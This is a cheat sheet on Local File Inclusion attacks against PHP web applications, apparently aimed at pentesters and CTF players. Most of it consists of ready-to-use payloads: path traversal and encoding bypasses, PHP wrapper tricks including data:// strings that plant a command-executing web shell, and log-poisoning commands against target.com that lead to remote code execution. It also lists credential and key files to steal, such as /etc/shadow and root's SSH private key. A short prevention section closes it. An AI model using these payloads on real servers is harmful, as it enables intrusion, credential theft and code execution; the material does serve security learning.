Local File Inclusion (LFI) Techniques Cheat Sheet

📌 What is LFI?
Local File Inclusion is a vulnerability that allows an attacker to include files from the server through the web browser. This typically occurs when user input is used in file operations without proper validation.

Vulnerable Code Example:

php<?php
$page = $_GET['page'];
include($page . '.php');
?>

🎯 Basic LFI Testing

Simple Path Traversal
?page=../../../etc/passwd
?page=../../../../etc/passwd
?page=../../../../../etc/passwd
?page=../../../../../../etc/passwd

# Windows
?page=../../../windows/win.ini
?page=../../../../boot.ini
Null Byte Injection (PHP < 5.3.4)
?page=../../../etc/passwd%00
?page=../../../../etc/passwd%00.jpg

🔧 PHP Wrapper Techniques

php://filter (Most Reliable)
Base64 Encoding:
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/convert.base64-encode/resource=config
?page=php://filter/convert.base64-encode/resource=../../../etc/passwd

# Decode with:
echo "base64string" | base64 -d
ROT13 Encoding:
?page=php://filter/read=string.rot13/resource=index
?page=php://filter/read=string.rot13/resource=config

# Decode with ROT13 tool or manually
Chain Multiple Filters:
?page=php://filter/convert.base64-encode|convert.base64-decode/resource=index
?page=php://filter/string.rot13|string.rot13/resource=index
php://input (Requires allow_url_include=On)
Send PHP code in POST body:
bashcurl -X POST --data "<?php system('ls'); ?>" "http://target.com/index.php?page=php://input"
data:// Protocol (Requires allow_url_include=On)
?page=data://text/plain,<?php system($_GET['cmd']); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Then execute commands:
&cmd=ls
&cmd=cat /etc/passwd
expect:// Protocol (Requires expect extension - rare)
?page=expect://id
?page=expect://whoami
?page=expect://ls
zip:// and phar:// (File Upload Required)

# Upload a zip file containing shell.php
?page=zip://path/to/uploaded.zip%23shell

# Upload a phar file
?page=phar://path/to/uploaded.phar/shell

🛡️ Filter Bypass Techniques
Encoding Bypasses
URL Encoding:
?page=..%2F..%2F..%2Fetc%2Fpasswd
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
Double URL Encoding:
?page=..%252F..%252F..%252Fetc%252Fpasswd
UTF-8 Encoding:
?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
Path Traversal Variations
Dot Variations:
?page=....//....//....//etc/passwd
?page=..././..././..././etc/passwd
?page=....\/....\/....\/etc/passwd
Mixed Slashes:
?page=..\..\..\etc\passwd
?page=..\/..\/..\/etc/passwd
?page=../..///..////etc/passwd
Extension Bypasses
Null Byte (old PHP):
?page=../../etc/passwd%00
?page=../../etc/passwd%00.jpg
Truncation (PHP path length limit was 4096):
?page=../../etc/passwd................................................................
[repeat dots many times]
Question Mark (sometimes strips extension):
?page=../../etc/passwd?
?page=../../etc/passwd%3f

📁 Common Files to Target
Linux/Unix Systems
System Information:
/etc/passwd          # User accounts
/etc/shadow          # Password hashes (requires root)
/etc/group           # User groups
/etc/hosts           # Host file
/etc/hostname        # System hostname
/etc/issue           # OS identification
/proc/version        # Kernel version
/proc/self/environ   # Environment variables
Web Server Logs:
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
Application Files:
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.htaccess
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
SSH Keys:
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
Windows Systems
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
C:\windows\system32\config\sam
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
Web Application Files

# PHP
config.php
database.php
db.php
settings.php
wp-config.php (WordPress)

# Python
settings.py
config.py
__init__.py

# Node.js
.env
config.json
package.json

🚀 LFI to RCE (Remote Code Execution)
Log Poisoning
1. Apache/Nginx Access Logs
Inject PHP code in User-Agent:
bashcurl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Then include the log:
?page=../../../../var/log/apache2/access.log&cmd=whoami
2. SSH Log Poisoning
bashssh '<?php system($_GET['cmd']); ?>'@target.com

# Then:
?page=../../../../var/log/auth.log&cmd=id
Session File Inclusion
php# If you can control session data
# PHP stores sessions in /var/lib/php/sessions/sess_[SESSID]

?page=../../../../var/lib/php/sessions/sess_your_session_id
/proc/self/environ
# Environment variables may be injectable
?page=../../../../proc/self/environ

# Try poisoning User-Agent first

🔍 Testing Methodology
Step 1: Identify the Parameter
Look for parameters that might load files:

?page=, ?file=, ?document=, ?folder=, ?root=, ?path=
?include=, ?load=, ?show=, ?read=

Step 2: Test for Basic LFI
?page=../../../etc/passwd
Step 3: If Blocked, Try Bypasses

Try encoding (URL, double URL encoding)
Try path variations (....//....//..../)
Try null bytes (%00)

Step 4: Try PHP Wrappers
?page=php://filter/convert.base64-encode/resource=index
Step 5: Check for RCE Potential

Can you access logs?
Can you upload files?
Can you use data:// or expect://?

Step 6: Enumerate Interesting Files

Configuration files
Database credentials
API keys
Source code


🛠️ Useful Tools
Automated Scanners
bash# LFISuite
python3 lfisuite.py

# Fimap
fimap -u "http://target.com/index.php?page=test"

# Kadimus
./kadimus -u "http://target.com/index.php?page=test" -A

# FFUF for fuzzing
ffuf -u "http://target.com/?page=FUZZ" -w /path/to/lfi-wordlist.txt
Manual Testing
bash# Curl
curl "http://target.com/?page=../../../etc/passwd"

# With custom headers
curl -H "User-Agent: <?php system('id'); ?>" http://target.com/

# Burp Suite - Intercept and modify requests
# ZAP - Automated scanning

🎯 CTF-Specific Tips

Check for hints in challenge description

"View source", "read files", "admin panel" = likely LFI


Start with PHP wrappers in CTFs

CTF challenges often have filters specifically to teach wrapper usage


Look for flag files

   ?page=php://filter/convert.base64-encode/resource=flag
   ?page=php://filter/convert.base64-encode/resource=../flag
   ?page=php://filter/convert.base64-encode/resource=../../flag.txt

Read all PHP files

index.php, config.php, admin.php, login.php


Don't forget to decode

If using base64 filter, remember to decode the output!




⚠️ Prevention & Mitigation
For Developers:
php// BAD - Vulnerable to LFI
$page = $_GET['page'];
include($page . '.php');

// BETTER - Whitelist approach
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';

if (in_array($page, $allowed, true)) {
    include($page . '.php');
} else {
    include('404.php');
}

// BEST - Use a proper router/framework
// Don't directly include user input
Security Measures:

Use whitelist validation
Disable dangerous PHP functions: allow_url_include, allow_url_fopen
Use open_basedir to restrict file access
Sanitize and validate ALL user input
Use frameworks with built-in protections
Implement proper logging and monitoring


📚 Additional Resources

OWASP - File Inclusion
PayloadsAllTheThings - LFI
HackTricks - File Inclusion
PHP Wrapper Documentation


Last Updated: December 14, 2024
